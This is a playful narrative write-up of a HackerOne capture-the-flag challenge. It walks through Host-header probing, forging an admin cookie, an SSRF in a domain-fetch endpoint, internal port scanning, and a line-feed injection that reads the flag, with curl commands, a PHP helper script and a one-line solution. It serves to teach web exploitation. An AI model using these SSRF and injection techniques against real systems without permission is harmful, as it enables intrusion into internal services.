# The CTF from \u000aHELL

## Chapter 1

IT WAS A DARK AND STORMY^w^w^w^w^w^wIt was a bright and sunny Tuesday afternoon. Tom had just arrived back
at the office after a trip to down south. He'd been to a dinner in London; helping HackerOne give new and
prospective customers advice on their bug bounty programs.

With the few emails he'd received responded to: he span in his chair, sipping at his coffee, wondering how
to best to limber up his brain into 'work mode' after a night of free drinks. His aging neurons creaked and
groaned; there was something he'd seen the day before that he wanted to try, but he couldn't quite remember
what it might be - was it a new JavaScript libary?

The CTF! That handsome devil Jobert at HackerOne had tweeted about a new CTF. The last one was fun - save for
the whole 'invalid JSON' debacle - so surely that would be the perfect thing to get his mental gears turning
smoothly. He switched to his web browser, found the tweet and followed the link:

> An engineer of acme.org launched a new server for a new admin panel at http://104.236.20.43/.
> He is completely confident that the server can’t be hacked. He added a tripwire that notifies
> him when the flag file is read. He also noticed that the default Apache page is still there,
> but according to him that’s intentional and doesn’t hurt anyone. Your goal? Read the flag!

He clicked the link. The default Apache page filled the browser window; he smiled slightly - to him the default
page was a sign of a brand new server, he could practically smell that new-server smell. He tried a few obvious
paths: `/admin`, `/cpanel`... Nothing; 404s were all he saw. A different port then, maybe? Time for the terminal;
he always felt more at home when his screen was filled with text.

```
▶ nmap -sT 104.236.20.43 -p1-65535

Starting Nmap 7.01 ( https://nmap.org ) at 2017-11-14 14:50 UTC
Nmap scan report for 104.236.20.43
Host is up (0.070s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 105.54 seconds
```

Ports 22 and 80. No dice. He leant back in his chair and took a deep breath. He tried probing the SSH
port but decided there was nothing interesting to be found there quicker than you can type `ssh -vvv`.

What else might hide this machine's true purpose in life? Port knocking? Even Jobert wasn't *that* evil.
Virtual hosts! Name-based virtual hosts! He had thought it suspect that only an IP address was given.
It was time to probe some more.

```
▶ curl -s http://104.236.20.43 -H'Host: acme.org'

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
      Modified from the Debian original for Ubuntu
...
```

The default page. He tried again:

```
▶ curl -s http://104.236.20.43 -H'Host: admin.acme.org'
▶ 
```

Ah hah! An empty response! He added the `-i` flag to see the headers:

```
▶ curl -is http://104.236.20.43 -H'Host: admin.acme.org'
HTTP/1.1 200 OK
Date: Tue, 14 Nov 2017 14:57:35 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: admin=no
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Interesting! That cookie was an obvious thing to play with:

```
▶ curl -is http://104.236.20.43 -H'Host: admin.acme.org' -H'Cookie: admin=yes'
HTTP/1.1 405 Method Not Allowed
Date: Tue, 14 Nov 2017 14:59:25 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Method Not Allowed? He tried a `POST`:

```
▶ curl -is http://104.236.20.43 -H'Host: admin.acme.org' -H'Cookie: admin=yes' -d'{}'
HTTP/1.1 406 Not Acceptable
Date: Tue, 14 Nov 2017 14:59:39 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

A new error. Few things in life give the feeling of progress like a new error message.

The many hours spent reverse-engineering undocumented APIs from vendors streamed through
his brain. Why would the request not be acceptable? Oh; the content-type. Duh.

```
▶ curl -is http://104.236.20.43 -H'Host: admin.acme.org' -H'Cookie: admin=yes' -H'Content-Type: application/json' -d'{}'
HTTP/1.1 418 I'm a teapot
Date: Tue, 14 Nov 2017 13:02:53 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 31
Content-Type: application/json

{"error":{"domain":"required"}}
```

"*You're* a teapot, Jobert", he thought; but the next step seemed obvious:

```
▶ curl -s http://104.236.20.43 -H'Host: admin.acme.org' -H'Cookie: admin=yes' -H'Content-Type: application/json' -d'{"domain": "admin.acme.org"}'
{"error":{"domain":"incorrect value, .com domain expected"}}
```

OK, no problem there either:

```
▶ curl -s http://104.236.20.43 -H'Host: admin.acme.org' -H'Cookie: admin=yes' -H'Content-Type: application/json' -d'{"domain": "212.acme.com"}'
{"next":"\/read.php?id=0"}
```

The next step of the challenge had presented itself. He requested the new file:

```
▶ curl -s -H'Host: admin.acme.org' -H'Cookie: admin=yes' http://104.236.20.43/read.php?id=0
{"data":""}
```

Odd. He thought maybe he had to set the data in the request:

```
▶ curl -s http://104.236.20.43 -H'Host: admin.acme.org' -H'Cookie: admin=yes' -H'Content-Type: application/json' -d'{"domain": "212.acme.com", "data": "Jobert <3 PHP"}'
{"next":"\/read.php?id=1"}
▶ curl -s -H'Host: admin.acme.org' -H'Cookie: admin=yes' http://104.236.20.43/read.php?id=1
{"data":""}
```

No. That wasn't it. Perhaps it's fetching data from the domain? He logged into CloudFlare and
configured a new subdomain: `212.tomnomnom.com`. He pointed it at a server that returned simply:

```
▶ curl -s http://212.tomnomnom.com
:)
```

He tried his new subdomain:

```
▶ curl -s http://104.236.20.43 -H'Host: admin.acme.org' -H'Cookie: admin=yes' -H'Content-Type: application/json' -d'{"domain": "212.tomnomnom.com"}'
{"next":"\/read.php?id=2"}
▶ curl -s -H'Host: admin.acme.org' -H'Cookie: admin=yes' http://104.236.20.43/read.php?id=2
{"data":"OikK"}
```

Some wild data appears! It looked base64 encoded, so with a bit some help from `jq` and his faithful
companion (bash) he decoded it:

```
▶ curl -s -H'Host: admin.acme.org' -H'Cookie: admin=yes' http://104.236.20.43/read.php?id=2 | jq -r '.data' | base64 --decode
:)
```

Superb. It looks like today's episode is sponsored by the letters S, S, R, and F.

He added some logging to his server to see if there was a user agent, or some other juicy info
that came with the request hitting his server, but there was nothing. "Ah well", he thought,
"it was worth a try".

He glanced at the clock: 15:17. It had been only just over half an hour since he began, and it
was time to do some actual work, but he felt like he'd made real progress. This was going to be *easy*.


## Chapter 1.5

That evening, after the kids were tucked up in bed, Tom found himself with an hour or so to spare.
He slipped into his garage where his computer sat waiting for him to pound his fingers against the
keys with reckless abandon.

He modified his page sat at `212.tomnomnom.com` and made some more requests. Was it a Phantom JS instance
visiting the page? He added some JavaScript to the page to test the theory but came up empty handed.
More ideas came and went - was is an old school SSI injection? No. How about redirecting to a different
page? No luck there either. It was time to try something new:

```
▶ curl -s http://104.236.20.43 -H'Host: admin.acme.org' -H'Cookie: admin=yes' -H'Content-Type: application/json' -d'{"domain": "localhost/212.tomnomnom.com"}'
{"next":"\/read.php?id=35"}
▶ curl -s -H'Host: admin.acme.org' -H'Cookie: admin=yes' http://104.236.20.43/read.php?id=35 | jq -r '.data' | base64 --decode
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /212.tomnomnom.com was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at localhost Port 80</address>
</body></html>
```

Ah, now *that* was interesting. But how could he ditch that `212.tomnomnom.com` part of the path? A `?`?

```
▶ curl -s http://104.236.20.43 -H'Host: admin.acme.org' -H'Cookie: admin=yes' -H'Content-Type: application/json' -d'{"domain": "localhost/?212.tomnomnom.com"}'
{"error":{"domain":"domain cannot contain ?"}}
```

No. An octothorpe?

```
▶ curl -s http://104.236.20.43 -H'Host: admin.acme.org' -H'Cookie: admin=yes' -H'Content-Type: application/json' -d'{"domain": "localhost/#212.tomnomnom.com"}'
{"error":{"domain":"domain cannot contain #"}}
```

No again. Curses. `&`? No; the same fate was bestowed even for the almighty ampersand.

The IDs continued to climb as he read blog posts, RFCs, PDFs... Nothing worked. Soon his hour
was up, and it was time to sleep. There was no work the next day, and perhaps - he thought - his
brain might surprise him over night. Might the answer come to him in a dream?!


## Chapter 2
The answer did not come to him in a dream. Bleary-eyed, he stumbled through his morning routine.
He clothed and fed his son and took him to nursery, he tidied the kitchen, he made some coffee, and
then headed back into the garage.

He had grown tired of requesting one URL to set the domain, and then another to read the response; so
he started the day with some PHP. The plan was to automate the writing and the reading in one command;
that way he could really pick up the pace:

```php
#!/usr/bin/php
<?php
const BASE = "http://104.236.20.43";

$domain = $argv[1]?? '212.example.com';

// no json_encode so I can manually type escape sequences etc
$write = req(BASE, ['Content-Type: application/json'], '{"domain": "'.$domain.'"}');
echo $domain.PHP_EOL;
echo $write.PHP_EOL;

$write = json_decode($write);
if (!$write || !isset($write->next)){
    die("no next url\n");
}

$read = req(BASE.$write->next);
echo $read.PHP_EOL.PHP_EOL;

$read = json_decode($read);
if (!$read || !isset($read->data)){
    die("no data in response\n");
}

echo base64_decode($read->data).PHP_EOL;


function req($url, $headers = [], $data = null){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge([
        'Host: admin.acme.org',
        'Cookie: admin=yes',
    ], $headers));

    if (isset($data)){
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }

    $r = curl_exec($ch);
    curl_close($ch);
    return $r;
}
```

He didn't know it at the time, but that script - like many PHP scripts before it - would
ultimately be his downfall.

SSRF had never been his forte, but sooner or later he recalled that one of the things people
often did with an SSRF vulnerability was to scan internal ports. He tested a known-open port:

```
▶ ./fetch.php 'localhost:22/212.foo.com'
localhost:22/212.foo.com
{"next":"\/read.php?id=176"}
{"data":"U1NILTIuMC1PcGVuU1NIXzcuMnAyIFVidW50dS00dWJ1bnR1Mi4yDQpQcm90b2NvbCBtaXNtYXRjaC4K"}

SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
Protocol mismatch.
```

The theory worked! He sat quietly with his eyes closed and tried to imagine what he might
do if *he* were the sysadmin; what ports might be listening? 8080?

```
▶ ./fetch.php 'localhost:8080/212.foo.com'
localhost:8080/212.foo.com
{"next":"\/read.php?id=177"}
{"data":""}
```

Nothing. 8000?

```
▶ ./fetch.php 'localhost:8000/212.foo.com'
localhost:8000/212.foo.com
{"next":"\/read.php?id=178"}
{"data":""}
```

Negatory. 8001? 443? 8443? 23?! Every one of them the same. "But wait!", he thought,
"This thing is requesting pages; perhaps there's a cache! Maybe memcached or redis.".

Ports 11211 and 6379 were requested, but returned nothing.

Time passed. More payloads were tried. Frustration was vented in Slack. He decided to
stop playing with ports and focus on the other problem he had: ditching that nasty
trailing `212.foo.com` from the paths he was requesting.

The standard options were already exhausted: `?`, `#`, `&`, and `%` weren't allowed.
How about CRLF injection?

He tried `localhost:80/\u000d212.foo.com`; 400 Bad Request.

He tried `localhost:80/\u000a212.foo.com`; an empty response?

He tried `\r\n`, and `\n\r`, and `\r\n\r\n`... Nothing.

Time passed, more coffee was made, more payloads were tried, and still the IDs climbed
without yielding anything new.

More coffee. More time. More venting frustration on Slack. Wait... What's this?!
A ray of light! A cryptic clue in the form a DM: he needed to focus on the port.

A mistake he had made - one of the many - was to think like the sysadmin configuring
the server. All the common ports had been tried; everything a well-trained sysadmin
might pick; and yet there was no response from any of them.

Then a realisation struck! He rushed to his wardrobe, dug through the drawers, and then
he found it: a plain white t-shirt that bore the simple phrase:

> I <3 PHP

It was time to think like Jobert.

Donning his new atire, he sat at his keyboard, stretched his arms out in front of him,
cracked his knuckles just like Station in Bill and Ted's Bogus Journey and typed:

```
▶ ./fetch.php 'localhost:1337@212.foo.com' 
localhost:1337@212.foo.com
{"next":"\/read.php?id=592"}
{"data":"SG1tLCB3aGVyZSB3b3VsZCBpdCBiZT8K"}

Hmm, where would it be?
```

Yes. That is the proverbial badger. A step forward at last.

## Chapter 3

So with a new port to probe and several more pints of coffee, our hero has but one
problem left to solve: actually get the bloody flag.

`/flag` would be the obvious place to look of course, but there was a problem:

```
▶ ./fetch.php 'localhost:1337/212.foo.com' 
localhost:1337/212.foo.com
{"next":"\/read.php?id=593"}
{"data":"PGh0bWw+DQo8aGVhZD48dGl0bGU+NDA0IE5vdCBGb3VuZDwvdGl0bGU+PC9oZWFkPg0KPGJvZHkgYmdjb2xvcj0id2hpdGUiPg0KPGNlbnRlcj48aDE+NDA0IE5vdCBGb3VuZDwvaDE+PC9jZW50ZXI+DQo8aHI+PGNlbnRlcj5uZ2lueC8xLjEwLjMgKFVidW50dSk8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4NCg=="}

<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.10.3 (Ubuntu)</center>
</body>
</html>
```

That cursed trailing `212.foo.com` would not go away. For what seemed like an
eternity he tried new payloads: `\u000d`, `\r\n`, `\n\r`, `\u2028` (hey, it *might*
have worked!).

After a while he glanced at the ID retuned for his latest payload:

```
▶ ./fetch.php 'localhost:1337/\u000a212.foo.com' 
localhost:1337/\u000a212.foo.com
{"next":"\/read.php?id=596"}
{"data":"IA=="}
```

596?! Had he really tried *that* many different payloads? No. No he had not.

The thing with that PHP script he had wrote, was it assumed that the ID you got
back would always have the returned data for that request. It worked for all of
the 'simple' payloads, but when line feeds and carriage returns were involved
things got interesting. All along he had wrongly assumed that the entire payload
was being requested - and that the part of the path after the line breaks would
be pushed into the headers of the request.

What was actually happening was that the domains were being stored in some kind
of line-delimited fashion - perhaps even in a text file. The ID you got back was
really the number of lines in the file! The IDs were going up by more than one!

EUREKA!


```
▶ ./fetch.php 'localhost:1337/\u000a212.foo.com' 
localhost:1337/\u000a212.foo.com
{"next":"\/read.php?id=598"}
{"data":"IA=="}
▶ curl -s -H'Host: admin.acme.org' -H'Cookie: admin=yes' http://104.236.20.43/read.php?id=597 | jq -r '.data' | base64 --decode
Hmm, where would it be?
```

ID 598 returned nothing; but ID 597? That had data from the index page in it. He
very nearly had the solution he needed hours earlier but just didn't know it at the time.

So could finding the flag really be as simple as... No... Really?

```
▶ ./fetch.php 'localhost:1337/flag\u000a212.foo.com' 
localhost:1337/flag\u000a212.foo.com
{"next":"\/read.php?id=600"}
{"data":"IA=="}
```

Nothing for ID 600, but...

```
▶ curl -s -H'Host: admin.acme.org' -H'Cookie: admin=yes' http://104.236.20.43/read.php?id=599 | jq -r '.data' | base64 --decode
FLAG: CF,2dsV\/]fRAYQ.TDEp`w"M(%mU;p9+9FD{Z48X*Jtt{%vS($g7\S):f%=P[Y@nka=<tqhnF<aq=K5:BC@Sb*{[%z"+@yPb/nfFna<e$hv{p8r2[vMMF52y:z/Dh;{6
```

Our hero, equal parts frustrated and elated, opened a new text document and began to type:

```
# The CTF from \u000aHELL

## Chapter 1

IT WAS A DARK AND STORMY^w^w^w^w^w^w
```

## Bonus

As a bonus, here's a lightly code-golfed solution for the whole thing:

```
▶ r(){ curl -H'Host:admin.acme.org' -H'Cookie:admin=yes' -H'Content-Type:application/json' 104.236.20.43$@;};r /read.php?id=$(($(r / -d'{"domain":"0:1337/flag\n212..com"}'|sed 's/[^0-9]//g')-1))|jq -r '.[]'|base64 -d
FLAG: CF,2dsV\/]fRAYQ.TDEp`w"M(%mU;p9+9FD{Z48X*Jtt{%vS($g7\S):f%=P[Y@nka=<tqhnF<aq=K5:BC@Sb*{[%z"+@yPb/nfFna<e$hv{p8r2[vMMF52y:z/Dh;{6
```

It feels a bit like cheating to include jq in there as it's not installed on most systems, but whatcha gonna do?

**Originally posted at https://gist.githubusercontent.com/tomnomnom/9cf20cc5c87ccbf38254862ac9826430/raw/6c671a80142261b03cf7b50090ed65c556bc578f/ctf-from-hell.md**
